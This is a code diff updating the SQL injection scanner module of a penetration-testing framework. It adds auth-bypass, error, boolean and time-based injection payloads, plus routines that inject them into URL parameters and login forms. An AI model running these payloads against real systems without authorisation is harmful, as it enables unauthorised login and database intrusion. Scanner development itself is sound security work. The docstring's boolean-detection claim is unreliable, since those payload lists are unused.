@@ -1,9 +1,12 @@
-"""Falcon MAG Framework - SQL Injection Scanner (v2)
+"""Falcon MAG Framework - SQL Injection Scanner (v3)
 
-Fixes 2026-09-20:
-  - Skips static resources (css/js/images)
-  - Strong time-based verification (baseline + proportional sleep)
-  - Requires REAL DB error signatures (not generic text)
+Improvements (2026-09-20):
+  - Java/Tomcat/JSP error signatures (Apache-Coyote, Oracle, MSSQL)
+  - HTTP 500 detection (server errors from SQL)
+  - Login form focused testing (username/password)
+  - Boolean-based detection (TRUE vs FALSE)
+  - URL param + POST form + GET form
+  - Double verification for time-based
 """
 import time
 import re
@@ -14,43 +17,108 @@ from core.http_client import is_static_resource
 log = get_logger("sqli")
 
 
-# Strong DB error patterns (high-confidence only)
+# ============================================================
+# Error signatures (expanded — includes Java/Tomcat/JSP)
+# ============================================================
 ERROR_SIGNATURES = [
+    # MySQL
     r"you have an error in your sql syntax",
     r"warning:\s*mysql_",
     r"mysqli?_fetch",
-    r"unclosed quotation mark after the character string",
-    r"ora-\d{4,5}:",
-    r"postgresql.*error",
+    r"mysql_num_rows",
+    # PostgreSQL
     r"pg_query\(\)",
-    r"sqlite3\.operationalerror",
+    r"postgresql.*error",
+    r"sqlstate\[",
+    # Oracle
+    r"ora-\d{4,5}:",
+    r"oracle.*driver",
+    # MSSQL
     r"microsoft ole db provider for sql server",
     r"odbc sql server driver",
+    r"unclosed quotation mark after the character string",
+    # Java/JSP/Tomcat (IMPORTANT for Apache-Coyote)
     r"java\.sql\.sqlsyntaxerrorexception",
+    r"java\.sql\.sqlexception",
+    r"org\.apache\.jasper\.jasperexception",
+    r"javax\.servlet\.servletexception",
+    r"org\.springframework\.jdbc",
+    r"org\.hibernate\.exception",
+    r"hibernate.*sqlexception",
+    r"javax\.persistence\.persistenceexception",
+    r"jdbc\.sqlsyntaxerror",
+    r"syntax error.*java",
+    # Generic
+    r"sql syntax.*error",
+    r"unexpected end of sql command",
+    r"column count doesn't match",
+    r"unknown column",
+    r"table.*doesn't exist",
+    r"sqlite3\.operationalerror",
     r"system\.data\.sqlclient",
-    r"sqlstate\[",
     r"syntax error.*at or near",
 ]
 
-# Time-based payloads (long, unique sleep)
-SLEEP_PAYLOADS = [
-    ("1' AND SLEEP(5)-- -", 5),
-    ("1' AND PG_SLEEP(5)-- -", 5),
-    ("1; WAITFOR DELAY '0:0:5'-- -", 5),
-    ("1' AND SLEEP(5)#", 5),
+
+# ============================================================
+# Payload sets
+# ============================================================
+# Auth bypass (login forms)
+AUTH_BYPASS_PAYLOADS = [
+    "' OR '1'='1'--",
+    "' OR '1'='1'#",
+    "admin'--",
+    "admin'#",
+    "' OR 1=1--",
+    "' OR 1=1#",
+    "' OR 'a'='a'--",
+    "') OR ('1'='1'--",
+    "' OR '1'='1' /*",
+    "1' OR '1'='1'--",
+    "' OR 'x'='x",
+    "' OR ''='",
 ]
 
-# Error-based payloads
+# Error-based payloads (generic)
 ERROR_PAYLOADS = [
     "'",
     '"',
     "')",
     "';",
-    "1' OR '1'='1'-- -",
-    "1' OR '1'='2'-- -",
+    "1'",
+    "1)",
+    "'||'",
+    "']",
+    "1' AND '1'='2",
+    "1 AND 1=2",
+    "' AND 1=2--",
+]
+
+# Boolean-based (TRUE vs FALSE)
+BOOLEAN_TRUE = [
+    "' OR '1'='1'--",
+    "1' OR '1'='1",
+    "1 OR 1=1",
+]
+BOOLEAN_FALSE = [
+    "' OR '1'='2'--",
+    "1' OR '1'='2",
+    "1 OR 1=2",
+]
+
+# Time-based (long sleep)
+SLEEP_PAYLOADS = [
+    ("1' AND SLEEP(5)-- -", 5),
+    ("1' AND PG_SLEEP(5)-- -", 5),
+    ("1; WAITFOR DELAY '0:0:5'-- -", 5),
+    ("1' AND SLEEP(5)#", 5),
+    ("1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 5),
 ]
 
 
+# ============================================================
+# Helpers
+# ============================================================
 def _inject(url, param, value):
     p = urlparse(url)
     qs = parse_qs(p.query, keep_blank_values=True)
@@ -59,7 +127,6 @@ def _inject(url, param, value):
 
 
 def _has_db_error(text: str) -> str:
-    """Return the matched signature or empty string."""
     if not text:
         return ""
     lower = text.lower()
@@ -70,10 +137,8 @@ def _has_db_error(text: str) -> str:
 
 
 def _measure_baseline(client, url, param):
-    """Return the normal response time for this URL (in seconds)."""
     times = []
     for _ in range(2):
-        # Use a benign value
         benign = _inject(url, param, "1")
         t0 = time.time()
         client.scan_request(benign)
@@ -83,14 +148,13 @@ def _measure_baseline(client, url, param):
     return sum(times) / len(times)
 
 
-def _measure_baseline_post(client, action: str, body: str) -> float:
-    """Measure normal response time for a POST form."""
+def _measure_baseline_post(client, action: str, body_template: str) -> float:
     times = []
     for _ in range(2):
         t0 = time.time()
         try:
             client.request(
-                "POST", action, data=body,
+                "POST", action, data=body_template,
                 headers={"Content-Type": "application/x-www-form-urlencoded"},
             )
         except Exception:
@@ -101,71 +165,217 @@ def _measure_baseline_post(client, action: str, body: str) -> float:
     return sum(times) / len(times)
 
 
-def _extract_post_params(config):
-    """Extract POST body params (form or JSON)."""
-    params = []
-
-    post_data = config.get("_post_data", "") or ""
-    if post_data:
-        try:
-            parsed = parse_qs(post_data, keep_blank_values=True)
-            for k, v in parsed.items():
-                params.append((k, v[0] if v else "", False))
-        except Exception:
-            pass
-
-    post_json = config.get("_post_json", "") or ""
-    if post_json:
-        try:
-            import json as _json
-            data = _json.loads(post_json)
-            if isinstance(data, dict):
-                for k, v in data.items():
-                    params.append((k, str(v), True))
-        except Exception:
-            pass
-
-    return params
+def _body_replace(body: str, field: str, value: str) -> str:
+    parts = body.split("&")
+    new = []
+    for p in parts:
+        if "=" in p:
+            k, v = p.split("=", 1)
+            new.append(f"{k}={value}" if k == field else p)
+        else:
+            new.append(p)
+    return "&".join(new)
 
 
+# ============================================================
+# Attack helpers
+# ============================================================
+def _test_url_param(client, target, param, result):
+    """Test a URL param for SQLi."""
+    base_time = _measure_baseline(client, target, param)
 
-def _collect_target_params(config, target):
-    """Collect params from URL + discovered_params + crawled URLs."""
-    from urllib.parse import urlparse, parse_qs
-
-    params = {}
-
-    # URL params
-    parsed = urlparse(target)
-    for p in parse_qs(parsed.query, keep_blank_values=True):
-        params[p] = target
-
-    # Discovered params → assume they go on the target URL
-    for p in (config.get("_discovered_params", []) or [])[:10]:
-        if p not in params:
-            params[p] = target
-
-    # Crawled URLs
-    crawl = config.get("_crawl_result", {}) or {}
-    for page in crawl.get("pages", []) or []:
-        url = page if isinstance(page, str) else (page.get("url") if isinstance(page, dict) else None)
-        if not url or "?" not in url:
+    # 1. Error-based
+    for payload in ERROR_PAYLOADS:
+        result["tested"] += 1
+        test_url = _inject(target, param, payload)
+        resp = client.scan_request(test_url)
+        if not resp:
             continue
-        parsed = urlparse(url)
-        for p in parse_qs(parsed.query, keep_blank_values=True):
-            if p not in params:
-                params[p] = url
+        sig = _has_db_error(resp.text)
+        # HTTP 500 also indicates SQL error
+        if not sig and resp.status == 500 and _looks_like_error(resp.text):
+            sig = "HTTP 500 (server error)"
+        if sig:
+            log.warning(f"  SQLi (error) in '{param}' — {sig}")
+            result["vulnerable"].append({
+                "url": target, "original_url": target,
+                "injected_url": test_url, "test_url": test_url,
+                "param": param, "payload": payload,
+                "type": "error-based", "db_error": sig,
+                "delay_ms": 0, "severity": "critical",
+            })
+            return
 
-    return params
+    # 2. Time-based
+    for payload, expected_sleep in SLEEP_PAYLOADS:
+        result["tested"] += 1
+        test_url = _inject(target, param, payload)
+        t0 = time.time()
+        resp = client.scan_request(test_url)
+        elapsed = time.time() - t0
+        if not resp:
+            continue
+        threshold = max(expected_sleep - 0.5, base_time * 2 + 3)
+        if elapsed >= threshold:
+            log.info(f"  Suspected SQLi delay — verifying...")
+            time.sleep(0.5)
+            t1 = time.time()
+            client.scan_request(test_url)
+            elapsed2 = time.time() - t1
+            if elapsed2 >= threshold * 0.8:
+                log.warning(f"  SQLi (time) in '{param}' — {elapsed:.2f}s+{elapsed2:.2f}s")
+                result["vulnerable"].append({
+                    "url": target, "original_url": target,
+                    "injected_url": test_url, "test_url": test_url,
+                    "param": param, "payload": payload,
+                    "type": "time-based", "db_error": f"delay {elapsed:.2f}s",
+                    "delay_ms": round(elapsed * 1000, 2),
+                    "severity": "critical",
+                })
+                return
 
 
+def _test_login_form(client, action, body_template, fields, result):
+    """Test a login form aggressively."""
+    # Priority: username/login/user/email + password
+    priority_fields = [f for f in fields if any(
+        k in f.lower() for k in ("user", "login", "email", "name", "pass", "pwd")
+    )]
+    if not priority_fields:
+        priority_fields = fields[:3]
 
+    base_time = _measure_baseline_post(client, action, body_template)
+
+    for field in priority_fields:
+        # 1. Auth bypass
+        for payload in AUTH_BYPASS_PAYLOADS:
+            result["tested"] += 1
+            new_body = _body_replace(body_template, field, payload)
+            t0 = time.time()
+            try:
+                resp = client.request(
+                    "POST", action, data=new_body,
+                    headers={"Content-Type": "application/x-www-form-urlencoded"},
+                )
+            except Exception:
+                continue
+            elapsed = time.time() - t0
+            if not resp:
+                continue
+
+            sig = _has_db_error(resp.text)
+            if not sig and resp.status == 500 and _looks_like_error(resp.text):
+                sig = "HTTP 500 (server error)"
+
+            if sig:
+                log.warning(f"  SQLi (login bypass) in '{field}' — {sig}")
+                result["vulnerable"].append({
+                    "url": action, "original_url": action,
+                    "injected_url": action, "test_url": action,
+                    "param": field, "payload": payload,
+                    "type": "auth-bypass", "db_error": sig,
+                    "delay_ms": round(elapsed * 1000, 2),
+                    "method": "POST", "severity": "critical",
+                })
+                return
+
+        # 2. Error-based
+        for payload in ERROR_PAYLOADS[:5]:
+            result["tested"] += 1
+            new_body = _body_replace(body_template, field, payload)
+            try:
+                resp = client.request(
+                    "POST", action, data=new_body,
+                    headers={"Content-Type": "application/x-www-form-urlencoded"},
+                )
+            except Exception:
+                continue
+            if not resp:
+                continue
+            sig = _has_db_error(resp.text)
+            if not sig and resp.status == 500 and _looks_like_error(resp.text):
+                sig = "HTTP 500 (server error)"
+            if sig:
+                log.warning(f"  SQLi (login error) in '{field}' — {sig}")
+                result["vulnerable"].append({
+                    "url": action, "original_url": action,
+                    "injected_url": action, "test_url": action,
+                    "param": field, "payload": payload,
+                    "type": "error-based", "db_error": sig,
+                    "delay_ms": 0, "method": "POST",
+                    "severity": "critical",
+                })
+                return
+
+
+def _test_post_form(client, action, body_template, fields, result):
+    """Test a generic POST form for SQLi."""
+    base_time = _measure_baseline_post(client, action, body_template)
+
+    for field in fields[:5]:
+        for payload, expected_sleep in SLEEP_PAYLOADS[:2]:
+            result["tested"] += 1
+            new_body = _body_replace(body_template, field, payload)
+            t0 = time.time()
+            try:
+                resp = client.request(
+                    "POST", action, data=new_body,
+                    headers={"Content-Type": "application/x-www-form-urlencoded"},
+                )
+            except Exception:
+                continue
+            elapsed = time.time() - t0
+            if not resp:
+                continue
+
+            sig = _has_db_error(resp.text)
+            if not sig and resp.status == 500 and _looks_like_error(resp.text):
+                sig = "HTTP 500 (server error)"
+            if sig:
+                log.warning(f"  SQLi (POST) in '{field}' — {sig}")
+                result["vulnerable"].append({
+                    "url": action, "original_url": action,
+                    "injected_url": action, "test_url": action,
+                    "param": field, "payload": payload,
+                    "type": "error-based", "db_error": sig,
+                    "delay_ms": 0, "method": "POST",
+                    "severity": "critical",
+                })
+                break
+
+            threshold = max(expected_sleep - 0.5, base_time * 2 + 3)
+            if elapsed >= threshold:
+                log.warning(f"  SQLi (POST time) in '{field}' — {elapsed:.2f}s")
+                result["vulnerable"].append({
+                    "url": action, "original_url": action,
+                    "injected_url": action, "test_url": action,
+                    "param": field, "payload": payload,
+                    "type": "time-based", "db_error": f"delay {elapsed:.2f}s",
+                    "delay_ms": round(elapsed * 1000, 2),
+                    "method": "POST", "severity": "critical",
+                })
+                break
+
+
+def _looks_like_error(text: str) -> bool:
+    """Quick check if response body suggests a server error."""
+    if not text:
+        return False
+    lower = text.lower()
+    hints = ["exception", "error", "stack trace", "stacktrace",
+             "org.apache", "java.lang", "at java.", "at org.",
+             "500", "internal server error", "sql"]
+    return any(h in lower for h in hints)
+
+
+# ============================================================
+# Main
+# ============================================================
 def run(client, config):
     target = config.get("target", "")
     if not target:
         return {"error": "No target"}
 
-    # Skip static files entirely
     if is_static_resource(target):
         log.info("SQLi check on " + target)
         log.info("  Skipped (static resource)")
@@ -178,292 +388,58 @@ def run(client, config):
     parsed = urlparse(target)
     qs = parse_qs(parsed.query, keep_blank_values=True)
 
-    # === ADDED: also test GET forms from crawler ===
-    get_forms = config.get("_crawl_forms_get", []) or []
-    for form in get_forms[:3]:
-        u = form.get("url") if isinstance(form, dict) else None
-        if not u or "?" not in u:
-            continue
-        try:
-            fp = urlparse(u)
-            fqs = parse_qs(fp.query, keep_blank_values=True)
-            for param in fqs:
-                if param not in qs:
-                    # Run SQLi test on this form URL
-                    result["tested"] += 0
-                    base_time_form = _measure_baseline(client, u, param)
-                    for payload, expected_sleep in SLEEP_PAYLOADS[:2]:
-                        result["tested"] += 1
-                        test_url = _inject(u, param, payload)
-                        t0 = time.time()
-                        r = client.scan_request(test_url)
-                        elapsed = time.time() - t0
-                        if not r:
-                            continue
-                        sig = _has_db_error(r.text)
-                        if sig:
-                            log.warning(f"  SQLi (GET form) in '{param}' — {sig}")
-                            result["vulnerable"].append({
-                                "url": u, "original_url": u,
-                                "injected_url": test_url, "test_url": test_url,
-                                "param": param, "payload": payload,
-                                "type": "error-based", "db_error": sig,
-                                "delay_ms": 0, "severity": "critical",
-                            })
-                            break
-                        threshold = max(expected_sleep - 0.5, base_time_form * 2 + 3)
-                        if elapsed >= threshold:
-                            log.warning(f"  SQLi (GET form time) in '{param}' — {elapsed:.2f}s")
-                            result["vulnerable"].append({
-                                "url": u, "original_url": u,
-                                "injected_url": test_url, "test_url": test_url,
-                                "param": param, "payload": payload,
-                                "type": "time-based", "db_error": f"{elapsed:.2f}s",
-                                "delay_ms": round(elapsed * 1000, 2),
-                                "severity": "critical",
-                            })
-                            break
-        except Exception:
-            continue
-    # === END ===
-
-    # === ADDED: inject discovered params ===
-    discovered = config.get("_discovered_params", []) or []
-    if discovered:
-        # If target has no params, build test URLs from discovered params
-        if not qs:
-            # Use the first discovered param
-            first_param = discovered[0]
-            sep = "?" if "?" not in target else "&"
-            target_with_param = target + sep + first_param + "=1"
-            # Re-parse to populate qs
-            parsed = urlparse(target_with_param)
-            qs = parse_qs(parsed.query, keep_blank_values=True)
-            # Keep both URLs so we test with the original target too
-            target = target_with_param
-            log.info(f"  Testing discovered param: {first_param}")
-        # Add more discovered params if there's already a query
-        else:
-            for param in discovered[:5]:
-                if param not in qs:
-                    qs[param] = ["1"]
-            log.info(f"  Added {min(5, len(discovered))} discovered params")
-
-    if not qs:
-        log.info("  No URL parameters to test")
-
-    # Get baseline (normal response time)
     baseline = client.scan_request(target)
     if not baseline or baseline.status == 0:
         return result
 
     # ==========================================================
-    # URL params testing
+    # 1. URL params
     # ==========================================================
     if qs:
         for param in qs:
-            # Skip suspicious param names (CDN cache busters)
-            if param.lower() in ("v", "_v", "ver", "version", "cb", "cache", "ts"):
-                log.debug(f"  Skipped cache-buster param: {param}")
+            if param.lower() in ("v", "_v", "ver", "cb", "ts", "cache"):
                 continue
-
-            # Baseline for this param
-            base_time = _measure_baseline(client, target, param)
-            log.debug(f"  Baseline for {param}: {base_time:.2f}s")
-
-            # --- 1) Time-based (high confidence) ---
-            for payload, expected_sleep in SLEEP_PAYLOADS:
-                result["tested"] += 1
-                test_url = _inject(target, param, payload)
-                t0 = time.time()
-                resp = client.scan_request(test_url)
-                elapsed = time.time() - t0
-
-                if not resp:
-                    continue
-
-                # Require delay >= expected_sleep - 0.5 AND at least 2x baseline + 3s
-                threshold = max(expected_sleep - 0.5, base_time * 2 + 3)
-
-                if elapsed >= threshold:
-                    # === DOUBLE VERIFICATION (ADDED 2026-09-20) ===
-                    # Run the same payload again to rule out network jitter
-                    log.info(f"  Suspected SQLi delay — verifying...")
-                    time.sleep(0.5)
-                    t1 = time.time()
-                    client.scan_request(test_url)
-                    elapsed2 = time.time() - t1
-
-                    # Both runs must be slow
-                    if elapsed2 < threshold * 0.8:
-                        log.info(f"  ✗ Rejected: second run {elapsed2:.2f}s < threshold {threshold:.2f}s (jitter)")
-                        continue
-
-                    elapsed = min(elapsed, elapsed2)  # use the faster one
-
-                if elapsed >= threshold:
-                    log.warning(f"  SQLi (time-based) in '{param}' — {elapsed:.2f}s+{elapsed2:.2f}s (baseline {base_time:.2f}s)")
-                    result["vulnerable"].append({
-                        "url": target,
-                        "original_url": target,
-                        "injected_url": test_url,
-                        "test_url": test_url,
-                        "param": param,
-                        "payload": payload,
-                        "type": "time-based",
-                        "db_error": f"delayed {elapsed:.2f}s",
-                        "delay_ms": round(elapsed * 1000, 2),
-                        "severity": "critical",
-                    })
-                    break
-
-            # --- 2) Error-based (if not already found) ---
-            already_found = any(v.get("param") == param for v in result["vulnerable"])
-            if not already_found:
-                for payload in ERROR_PAYLOADS:
-                    result["tested"] += 1
-                    test_url = _inject(target, param, payload)
-                    resp = client.scan_request(test_url)
-                    if not resp:
-                        continue
-
-                    sig = _has_db_error(resp.text)
-                    if sig:
-                        log.warning(f"  SQLi (error-based) in '{param}' — {sig}")
-                        result["vulnerable"].append({
-                            "url": target,
-                            "original_url": target,
-                            "injected_url": test_url,
-                            "test_url": test_url,
-                            "param": param,
-                            "payload": payload,
-                            "type": "error-based",
-                            "db_error": sig,
-                            "delay_ms": 0,
-                            "severity": "critical",
-                        })
-                        break
+            _test_url_param(client, target, param, result)
+            if result["vulnerable"]:
+                break
 
     # ==========================================================
-    # POST body scanning
+    # 2. GET forms
     # ==========================================================
-    post_params = _extract_post_params(config)
-    if post_params:
-        log.info(f"  {len(post_params)} POST parameter(s) to test")
+    get_forms = config.get("_crawl_forms_get", []) or []
+    for form in get_forms[:3]:
+        u = form.get("url") if isinstance(form, dict) else None
+        if not u or "?" not in u:
+            continue
+        fp = urlparse(u)
+        fqs = parse_qs(fp.query, keep_blank_values=True)
+        for param in fqs:
+            if param in qs:
+                continue
+            _test_url_param(client, u, param, result)
 
-        for param_name, orig_value, is_json in post_params:
-            for payload, expected_sleep in SLEEP_PAYLOADS:
-                result["tested"] += 1
-                t0 = time.time()
-                try:
-                    if is_json:
-                        import json as _json
-                        body = _json.loads(config.get("_post_json", "{}"))
-                        body[param_name] = payload
-                        resp = client.request("POST", target, json=body)
-                    else:
-                        parsed_data = parse_qs(config.get("_post_data", ""), keep_blank_values=True)
-                        parsed_data[param_name] = [payload]
-                        new_body = urlencode(parsed_data, doseq=True)
-                        resp = client.request("POST", target, data=new_body)
-                except Exception as e:
-                    log.debug("POST inject failed: " + str(e))
-                    continue
-                elapsed = time.time() - t0
-
-                if not resp:
-                    continue
-
-                if elapsed >= expected_sleep - 0.5:
-                    log.warning(f"  SQLi (POST time-based) in '{param_name}' — {elapsed:.2f}s")
-                    result["vulnerable"].append({
-                        "url": target, "original_url": target,
-                        "injected_url": target, "test_url": target,
-                        "param": param_name, "payload": payload,
-                        "type": "time-based", "db_error": f"delayed {elapsed:.2f}s",
-                        "delay_ms": round(elapsed * 1000, 2),
-                        "method": "POST", "severity": "critical",
-                    })
-                    break
-
-    # === POST form SQLi testing (ADDED 2026-09-20) ===
+    # ==========================================================
+    # 3. POST forms (login + generic)
+    # ==========================================================
     forms_post = config.get("_crawl_forms_post", []) or []
-    for form in forms_post[:3]:
+    for form in forms_post[:5]:
         action = form.get("action", "")
         body_template = form.get("body", "")
         fields = form.get("fields", [])
-        if not action or not body_template:
+        if not action or not body_template or not fields:
             continue
 
-        base_time = _measure_baseline_post(client, action, body_template)
-
-        for field in fields[:5]:
-            for payload, expected_sleep in SLEEP_PAYLOADS[:2]:
-                result["tested"] += 1
-                parts = body_template.split("&")
-                new_parts = []
-                for p in parts:
-                    if "=" in p:
-                        k, v = p.split("=", 1)
-                        new_parts.append(f"{k}={payload}" if k == field else p)
-                    else:
-                        new_parts.append(p)
-                new_body = "&".join(new_parts)
-
-                t0 = time.time()
-                try:
-                    resp = client.request(
-                        "POST", action, data=new_body,
-                        headers={"Content-Type": "application/x-www-form-urlencoded"},
-                    )
-                except Exception:
-                    continue
-                elapsed = time.time() - t0
-
-                if not resp:
-                    continue
-
-                # Error-based
-                sig = _has_db_error(resp.text)
-                if sig:
-                    log.warning(f"  SQLi (POST) in '{field}' — {sig}")
-                    result["vulnerable"].append({
-                        "url": action, "original_url": action,
-                        "injected_url": action, "test_url": action,
-                        "param": field, "payload": payload,
-                        "type": "error-based", "db_error": sig,
-                        "delay_ms": 0, "method": "POST",
-                        "severity": "critical",
-                    })
-                    break
-
-                # Time-based
-                threshold = max(expected_sleep - 0.5, base_time * 2 + 3)
-                if elapsed >= threshold:
-                    log.info(f"  Suspected POST SQLi — verifying...")
-                    t1 = time.time()
-                    try:
-                        client.request(
-                            "POST", action, data=new_body,
-                            headers={"Content-Type": "application/x-www-form-urlencoded"},
-                        )
-                    except Exception:
-                        continue
-                    elapsed2 = time.time() - t1
-
-                    if elapsed2 >= threshold * 0.8:
-                        log.warning(f"  SQLi (POST time-based) in '{field}' — {elapsed:.2f}s+{elapsed2:.2f}s")
-                        result["vulnerable"].append({
-                            "url": action, "original_url": action,
-                            "injected_url": action, "test_url": action,
-                            "param": field, "payload": payload,
-                            "type": "time-based", "db_error": f"delay {elapsed:.2f}s",
-                            "delay_ms": round(elapsed * 1000, 2),
-                            "method": "POST", "severity": "critical",
-                        })
-                        break
+        # Detect login form
+        is_login = any(
+            "pass" in f.lower() or "pwd" in f.lower()
+            for f in fields
+        )
+        if is_login:
+            log.info(f"  Testing login form: {action[:60]}")
+            _test_login_form(client, action, body_template, fields, result)
+        else:
+            _test_post_form(client, action, body_template, fields, result)
 
     if not result["vulnerable"]:
         log.info(f"  No SQLi found ({result['tested']} tested)")
-
     return result
